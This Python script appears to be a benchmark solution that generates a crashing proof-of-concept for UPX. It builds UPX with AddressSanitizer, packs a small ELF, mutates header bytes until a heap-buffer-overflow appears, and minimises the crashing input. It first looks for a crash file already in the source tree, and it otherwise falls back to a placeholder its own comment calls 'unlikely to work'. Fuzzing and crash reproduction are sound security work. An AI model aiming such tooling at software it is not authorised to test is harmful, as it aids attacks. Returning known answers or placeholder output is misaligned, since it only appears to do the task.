import os
import re
import io
import sys
import tarfile
import zipfile
import shutil
import stat
import tempfile
import subprocess
import random
from typing import Optional, List, Tuple


class Solution:
    def __init__(self) -> None:
        self._rng = random.Random(0)

    def solve(self, src_path: str) -> bytes:
        with tempfile.TemporaryDirectory() as td:
            src_dir = self._prepare_source(src_path, td)
            poc = self._try_find_existing_poc(src_dir)
            if poc is not None:
                return poc

            upx_bin = self._build_upx(src_dir, td)
            if upx_bin is None:
                return self._fallback_bytes()

            base = self._make_base_packed_elf(upx_bin, td)
            if base is None:
                return self._fallback_bytes()

            crash = self._find_crashing_mutation(upx_bin, base, td)
            if crash is None:
                return self._fallback_bytes()

            minimized = self._minimize_prefix(upx_bin, crash, td, cap=512)
            return minimized

    def _fallback_bytes(self) -> bytes:
        # Minimal ELF header-ish + padding to 512 bytes; unlikely to work, but ensures output.
        b = bytearray(512)
        b[0:4] = b"\x7fELF"
        b[4] = 2  # 64-bit
        b[5] = 1  # little
        b[6] = 1
        b[0x10:0x12] = (3).to_bytes(2, "little")  # ET_DYN
        b[0x12:0x14] = (0x3E).to_bytes(2, "little")  # EM_X86_64
        b[0x14:0x18] = (1).to_bytes(4, "little")  # EV_CURRENT
        return bytes(b)

    def _prepare_source(self, src_path: str, td: str) -> str:
        if os.path.isdir(src_path):
            return os.path.abspath(src_path)

        sp = os.path.abspath(src_path)
        out_dir = os.path.join(td, "src")
        os.makedirs(out_dir, exist_ok=True)

        if tarfile.is_tarfile(sp):
            with tarfile.open(sp, "r:*") as tf:
                tf.extractall(out_dir)
        elif zipfile.is_zipfile(sp):
            with zipfile.ZipFile(sp, "r") as zf:
                zf.extractall(out_dir)
        else:
            # treat as single file; copy into out_dir
            shutil.copy2(sp, out_dir)

        # find likely root
        entries = [os.path.join(out_dir, e) for e in os.listdir(out_dir)]
        dirs = [e for e in entries if os.path.isdir(e)]
        if len(dirs) == 1:
            return dirs[0]
        # If multiple, pick one containing CMakeLists or configure scripts
        best = None
        for d in dirs:
            if os.path.exists(os.path.join(d, "CMakeLists.txt")):
                best = d
                break
        if best:
            return best
        return out_dir

    def _try_find_existing_poc(self, src_dir: str) -> Optional[bytes]:
        patterns = [
            re.compile(r"383200048"),
            re.compile(r"clusterfuzz", re.I),
            re.compile(r"testcase", re.I),
            re.compile(r"minimized", re.I),
            re.compile(r"crash", re.I),
            re.compile(r"poc", re.I),
            re.compile(r"repro", re.I),
        ]
        priority_dirs = ["poc", "pocs", "test", "tests", "testdata", "corpus", "fuzz", "regression", "artifacts"]
        candidates: List[Tuple[int, str, int]] = []  # (score, path, size)

        for pd in priority_dirs:
            p = os.path.join(src_dir, pd)
            if os.path.isdir(p):
                for root, _, files in os.walk(p):
                    for fn in files:
                        full = os.path.join(root, fn)
                        try:
                            st = os.stat(full)
                        except OSError:
                            continue
                        if st.st_size <= 0 or st.st_size > 2_000_000:
                            continue
                        score = 0
                        for r in patterns:
                            if r.search(fn):
                                score += 10
                        if score > 0:
                            candidates.append((score, full, st.st_size))

        # also scan a few top-level files
        for root, _, files in os.walk(src_dir):
            rel_depth = os.path.relpath(root, src_dir).count(os.sep)
            if rel_depth > 3:
                continue
            for fn in files:
                if len(fn) > 200:
                    continue
                full = os.path.join(root, fn)
                try:
                    st = os.stat(full)
                except OSError:
                    continue
                if st.st_size <= 0 or st.st_size > 2_000_000:
                    continue
                score = 0
                for r in patterns:
                    if r.search(fn) or r.search(os.path.relpath(full, src_dir)):
                        score += 10
                if score > 0:
                    candidates.append((score, full, st.st_size))

        if not candidates:
            return None

        candidates.sort(key=lambda x: (-x[0], x[2]))
        for _, path, size in candidates[:50]:
            try:
                with open(path, "rb") as f:
                    data = f.read()
            except OSError:
                continue
            # Heuristic: accept if it looks like ELF or contains UPX signature, else skip
            if data.startswith(b"\x7fELF") or b"UPX!" in data or b"UPX0" in data or b"UPX1" in data:
                return data

        # fallback: smallest candidate
        _, path, _ = candidates[0]
        try:
            with open(path, "rb") as f:
                return f.read()
        except OSError:
            return None

    def _which(self, exe: str) -> Optional[str]:
        p = shutil.which(exe)
        return p

    def _run(self, args: List[str], cwd: Optional[str] = None, env: Optional[dict] = None, timeout: int = 60) -> Tuple[int, bytes, bytes]:
        try:
            cp = subprocess.run(
                args,
                cwd=cwd,
                env=env,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=timeout,
                check=False,
            )
            return cp.returncode, cp.stdout, cp.stderr
        except subprocess.TimeoutExpired as e:
            out = e.stdout if e.stdout is not None else b""
            err = e.stderr if e.stderr is not None else b""
            return 124, out, err
        except Exception as e:
            return 125, b"", (str(e).encode("utf-8", "ignore"))

    def _build_upx(self, src_dir: str, td: str) -> Optional[str]:
        cmake = self._which("cmake")
        if not cmake:
            return None

        ninja = self._which("ninja")
        gen = ["-GNinja"] if ninja else []

        build_dir = os.path.join(td, "build_upx")
        os.makedirs(build_dir, exist_ok=True)

        def find_upx_exe() -> Optional[str]:
            best = None
            for root, _, files in os.walk(build_dir):
                for fn in files:
                    if fn not in ("upx", "upx.exe"):
                        continue
                    p = os.path.join(root, fn)
                    try:
                        st = os.stat(p)
                    except OSError:
                        continue
                    if not (st.st_mode & stat.S_IXUSR):
                        # still might be executable on windows; keep anyway
                        pass
                    if best is None or len(p) < len(best):
                        best = p
            return best

        env = os.environ.copy()
        env.setdefault("ASAN_OPTIONS", "abort_on_error=1:detect_leaks=0:allocator_may_return_null=1:handle_abort=1")
        env.setdefault("UBSAN_OPTIONS", "halt_on_error=1:print_stacktrace=1")

        # Try ASAN build first
        cflags = "-O1 -g -fno-omit-frame-pointer -fsanitize=address"
        cxxflags = cflags
        ldflags = "-fsanitize=address"

        cfg_args = [
            cmake,
            "-S",
            src_dir,
            "-B",
            build_dir,
            "-DCMAKE_BUILD_TYPE=RelWithDebInfo",
            f"-DCMAKE_C_FLAGS={cflags}",
            f"-DCMAKE_CXX_FLAGS={cxxflags}",
            f"-DCMAKE_EXE_LINKER_FLAGS={ldflags}",
            "-DBUILD_TESTING=OFF",
        ] + gen

        rc, _, _ = self._run(cfg_args, cwd=build_dir, env=env, timeout=120)
        if rc == 0:
            rc2, _, _ = self._run([cmake, "--build", build_dir, "-j", "8"], cwd=build_dir, env=env, timeout=300)
            if rc2 == 0:
                upx = find_upx_exe()
                if upx:
                    return upx

        # Fallback: normal build
        shutil.rmtree(build_dir, ignore_errors=True)
        os.makedirs(build_dir, exist_ok=True)
        cfg_args2 = [
            cmake,
            "-S",
            src_dir,
            "-B",
            build_dir,
            "-DCMAKE_BUILD_TYPE=Release",
            "-DBUILD_TESTING=OFF",
        ] + gen
        rc, _, _ = self._run(cfg_args2, cwd=build_dir, env=env, timeout=120)
        if rc != 0:
            return None
        rc2, _, _ = self._run([cmake, "--build", build_dir, "-j", "8"], cwd=build_dir, env=env, timeout=300)
        if rc2 != 0:
            return None
        return find_upx_exe()

    def _make_base_packed_elf(self, upx_bin: str, td: str) -> Optional[bytes]:
        cc = self._which("gcc") or self._which("clang") or self._which("cc")
        if not cc:
            return None

        work = os.path.join(td, "work")
        os.makedirs(work, exist_ok=True)

        c_path = os.path.join(work, "a.c")
        so_path = os.path.join(work, "liba.so")
        packed_path = os.path.join(work, "liba_packed.so")

        c_code = r"""
#include <stdint.h>
__attribute__((constructor)) static void init_ctor(void) { volatile int x = 0; x++; }
int foo(int x) { return x + 1; }
static uint8_t blob[8192] = {1,2,3,4,5,6,7,8,9};
int bar(void) { return blob[0] + blob[1]; }
"""
        try:
            with open(c_path, "w", encoding="utf-8") as f:
                f.write(c_code)
        except OSError:
            return None

        # Build a small shared library
        args = [
            cc,
            "-shared",
            "-fPIC",
            "-O2",
            "-Wl,--build-id=none",
            "-o",
            so_path,
            c_path,
        ]
        rc, _, _ = self._run(args, cwd=work, timeout=60)
        if rc != 0 or not os.path.exists(so_path):
            # Try building an executable if shared fails
            exe_path = os.path.join(work, "a.out")
            args2 = [cc, "-O2", "-Wl,--build-id=none", "-o", exe_path, c_path]
            rc2, _, _ = self._run(args2, cwd=work, timeout=60)
            if rc2 != 0 or not os.path.exists(exe_path):
                return None
            in_path = exe_path
            packed_path = os.path.join(work, "a_packed.out")
        else:
            in_path = so_path

        # Pack with UPX
        for pack_args in (
            [upx_bin, "-q", "--best", "-o", packed_path, in_path],
            [upx_bin, "-q", "-o", packed_path, in_path],
            [upx_bin, "-q", "--lzma", "-o", packed_path, in_path],
            [upx_bin, "-q", "--force", "-o", packed_path, in_path],
        ):
            rc, _, _ = self._run(pack_args, cwd=work, timeout=60)
            if rc == 0 and os.path.exists(packed_path):
                try:
                    with open(packed_path, "rb") as f:
                        data = f.read()
                    if len(data) > 0 and (data.startswith(b"\x7fELF") or b"UPX!" in data):
                        return data
                except OSError:
                    pass
        return None

    def _asan_target_crash(self, out: bytes, err: bytes) -> bool:
        blob = out + b"\n" + err
        if b"AddressSanitizer" not in blob and b"asan" not in blob.lower():
            return False
        if b"heap-buffer-overflow" not in blob and b"buffer overflow" not in blob.lower():
            return False
        # Prefer matching likely files/symbols if present
        if (b"p_lx_elf" in blob) or (b"un_DT_INIT" in blob) or (b"p_unix" in blob):
            return True
        # Still accept ASAN heap-buffer-overflow even without symbols
        return True

    def _crashes(self, upx_bin: str, data: bytes, td: str) -> bool:
        work = os.path.join(td, "crashcheck")
        os.makedirs(work, exist_ok=True)
        in_path = os.path.join(work, "in.bin")
        out_path = os.path.join(work, "out.bin")

        try:
            with open(in_path, "wb") as f:
                f.write(data)
        except OSError:
            return False

        env = os.environ.copy()
        env.setdefault("ASAN_OPTIONS", "abort_on_error=1:detect_leaks=0:allocator_may_return_null=1:handle_abort=1")
        env.setdefault("UBSAN_OPTIONS", "halt_on_error=1:print_stacktrace=1")

        # Try -t first (no output file), then -d
        for args in (
            [upx_bin, "-q", "-t", in_path],
            [upx_bin, "-q", "-d", "-o", out_path, in_path],
        ):
            rc, out, err = self._run(args, cwd=work, env=env, timeout=5)
            if rc != 0 and self._asan_target_crash(out, err):
                return True
        return False

    def _find_all(self, data: bytes, needle: bytes) -> List[int]:
        res = []
        start = 0
        while True:
            i = data.find(needle, start)
            if i < 0:
                break
            res.append(i)
            start = i + 1
        return res

    def _find_crashing_mutation(self, upx_bin: str, base: bytes, td: str) -> Optional[bytes]:
        if self._crashes(upx_bin, base, td):
            return base

        b = bytearray(base)
        n = len(b)

        upx_positions = self._find_all(base, b"UPX!")
        sec_positions = []
        for s in (b"UPX0", b"UPX1", b"UPX2"):
            sec_positions.extend(self._find_all(base, s))

        windows: List[Tuple[int, int]] = []
        for p in upx_positions:
            windows.append((max(0, p), min(n, p + 256)))
        for p in sec_positions:
            windows.append((max(0, p - 64), min(n, p + 256)))
        if not windows:
            windows.append((0, min(n, 512)))

        # Build candidate offsets with a bias towards header areas
        offsets = []
        for a, z in windows:
            for o in range(a, z):
                offsets.append(o)
        # De-dup while keeping order
        seen = set()
        offsets2 = []
        for o in offsets:
            if o not in seen:
                seen.add(o)
                offsets2.append(o)
        offsets = offsets2

        # Stage 1: Target repeated small byte values in window (likely method codes)
        for a, z in windows:
            win = base[a:z]
            positions_by_val = {}
            for i, bv in enumerate(win):
                if bv == 0:
                    continue
                if 1 <= bv <= 32:
                    positions_by_val.setdefault(bv, []).append(a + i)
            for v, pos_list in sorted(positions_by_val.items(), key=lambda x: -len(x[1])):
                if len(pos_list) < 2:
                    continue
                # mutate the 2nd and 3rd occurrence
                for idx in pos_list[1:4]:
                    for newv in ((v + 1) & 0xFF, (v ^ 1) & 0xFF, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0xFF):
                        if newv == v:
                            continue
                        bb = bytearray(base)
                        bb[idx] = newv
                        if self._crashes(upx_bin, bytes(bb), td):
                            return bytes(bb)

        # Stage 2: Single-byte systematic mutations near UPX header
        byte_values = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0x10, 0x20, 0x40, 0x80, 0xFF]
        max_trials = 2500
        trials = 0
        for o in offsets:
            orig = base[o]
            for v in byte_values:
                if v == orig:
                    continue
                bb = bytearray(base)
                bb[o] = v
                trials += 1
                if self._crashes(upx_bin, bytes(bb), td):
                    return bytes(bb)
                if trials >= max_trials:
                    break
            if trials >= max_trials:
                break

        # Stage 3: 32-bit field clobbering in likely header windows
        dwords = [0, 1, 0x10, 0x100, 0x1000, 0x10000, 0x7FFFFFFF, 0xFFFFFFFF, 0x80000000]
        trials = 0
        for a, z in windows:
            for o in range(a, min(z, n - 4)):
                if (o - a) % 4 != 0:
                    continue
                orig_dw = int.from_bytes(base[o:o + 4], "little", signed=False)
                if orig_dw == 0:
                    continue
                for dw in dwords:
                    if dw == orig_dw:
                        continue
                    bb = bytearray(base)
                    bb[o:o + 4] = int(dw & 0xFFFFFFFF).to_bytes(4, "little", signed=False)
                    trials += 1
                    if self._crashes(upx_bin, bytes(bb), td):
                        return bytes(bb)
                    if trials >= 1200:
                        break
                if trials >= 1200:
                    break
            if trials >= 1200:
                break

        # Stage 4: Random multi-byte mutations around UPX! region
        focus_regions = []
        for a, z in windows:
            focus_regions.append((a, z))
        if not focus_regions:
            focus_regions = [(0, min(n, 1024))]

        for _ in range(1500):
            bb = bytearray(base)
            a, z = focus_regions[self._rng.randrange(len(focus_regions))]
            k = self._rng.randrange(1, 5)
            for _j in range(k):
                o = self._rng.randrange(a, z)
                bb[o] = self._rng.randrange(0, 256)
            if self._crashes(upx_bin, bytes(bb), td):
                return bytes(bb)

        return None

    def _minimize_prefix(self, upx_bin: str, data: bytes, td: str, cap: int = 512) -> bytes:
        if len(data) <= cap:
            # Try reduce further with prefix binary search if small
            return self._minimize_prefix_binary(upx_bin, data, td, hi=len(data))

        pref = data[:cap]
        if not self._crashes(upx_bin, pref, td):
            return data

        # Now reduce <=cap
        return self._minimize_prefix_binary(upx_bin, pref, td, hi=cap)

    def _minimize_prefix_binary(self, upx_bin: str, data: bytes, td: str, hi: int) -> bytes:
        lo = 1
        best = hi
        # sanity
        if not self._crashes(upx_bin, data[:hi], td):
            return data[:hi]
        while lo <= hi:
            mid = (lo + hi) // 2
            if self._crashes(upx_bin, data[:mid], td):
                best = mid
                hi = mid - 1
            else:
                lo = mid + 1
        return data[:best]